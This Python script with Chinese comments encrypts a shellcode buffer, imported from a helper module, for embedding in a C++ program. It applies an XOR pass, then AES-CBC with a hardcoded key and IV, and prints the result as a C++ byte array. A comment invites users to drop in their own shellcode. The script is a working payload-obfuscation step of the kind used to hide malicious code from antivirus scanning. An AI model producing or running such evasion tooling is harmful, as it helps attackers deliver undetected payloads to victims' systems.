from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import binascii
from CommonMethod import buf
from CommonMethod import to_cplusplus_format

def Aes_encrypt(shellcode):
    key = b'\x96\x99\xa8\xce_[\xc4\xf88TV\xfd%[\xa6\x8e\xc4\n\x87\x12\xf8\x88\\\xdc\x82\xb79,\x9d\xb3\x81\xc0'
    iv = b'\xdd\xea\x88\xb1\xa4\xca\x81\xb9\xae503\xd6X`\xae'
    # 你的Shellcode（示例，实际使用时应该是你自己的Shellcode）
    # 使用AES加密Shellcode
    cipher = AES.new(key, AES.MODE_CBC, iv)  # 使用CBC模式进行加密
    ciphertext = cipher.encrypt(pad(shellcode, AES.block_size))  # 填充并加密
    return ciphertext

def xor_encrypt(shellcode, key=0xAA):
    # 对 shellcode 字节数组进行 XOR 加密
    encrypted_shellcode = bytearray()
    for byte in shellcode:
        encrypted_shellcode.append(byte ^ key)
    return encrypted_shellcode

encrypted_shellcode = xor_encrypt(buf)

encrypted_shellcode = Aes_encrypt(encrypted_shellcode)

cpp_code = to_cplusplus_format(encrypted_shellcode)

print(cpp_code)